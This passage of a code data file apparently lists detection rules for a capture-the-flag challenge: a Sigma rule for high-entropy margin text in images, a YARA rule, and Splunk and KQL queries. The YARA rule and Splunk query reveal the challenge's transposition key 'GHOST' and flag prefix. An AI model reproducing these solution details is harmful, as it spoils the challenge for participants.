    sigmaRule: `title: Abnormal Side-Channel Text Encoding in Processed Graphics
id: 81729301-b918-4912-a192-817263541829
status: test
description: Detects strings of high-entropy ASCII text placed outside standard image bounding boxes.
references:
    - https://attack.mitre.org/techniques/T1027/
author: TraceHanami (Crypto)
date: 2026/08/01
tags:
    - attack.defense_evasion
logsource:
    category: content_disarm
    product: ocr_scanner
detection:
    selection:
        text_location: 'left_margin'
        entropy|gt: 4.2
    condition: selection
level: low`,
    yaraRule: `rule Transposition_Margin_Indicator {
    meta:
        description = "Detects known TomCTF challenge key artifacts"
        author = "TraceHanami Research"
        date = "2026-08-01"
    strings:
        $key = "GHOST" ascii wide
        $flag_prefix = "tomctf{" ascii
    condition:
        $key and $flag_prefix
}`,
    siemQueries: {
      splunk: `index=crypto_ops algorithm="transposition" key="GHOST"
| table _time, user, status, result`,
      kql: `AuditLogs
| where OperationName has "TranspositionDecrypt"
| project TimeGenerated, Initiator, OperationName, Result`
    }
  }
];
